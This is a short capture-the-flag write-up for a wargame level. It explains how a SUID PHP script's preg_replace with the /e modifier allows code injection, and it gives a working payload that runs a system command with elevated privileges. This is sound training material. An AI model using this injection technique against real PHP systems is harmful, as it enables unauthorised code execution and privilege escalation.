We can see an executable and a php file in the home directory.
Trying to run the binary gets us the message :

PHP Warning:  file_get_contents(): Filename cannot be empty in /home/user/level06/level06.php on line 4

We try to inspect that the php file does.

#!/usr/bin/php
<?php
function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
$r = x($argv[1], $argv[2]); print $r;
?>

The x function gets the content of the first arugment, and then uses preg_replace to replace that content. It matches everything that comes in the form of : 
[x ...] replaces it by what the y function returns. The y function captures what was matched by the regex, so for [x hello world], it would capture "hello world".
The /e modifier makes it so that (y(\"hello\")) is evaluated in php, meaning we can inject anything we'd like that file to run. 
And again, that file has the special bit set to SUID, with the file owner being flag06.
So we inject : 
[x {${@system(getflag)}}]

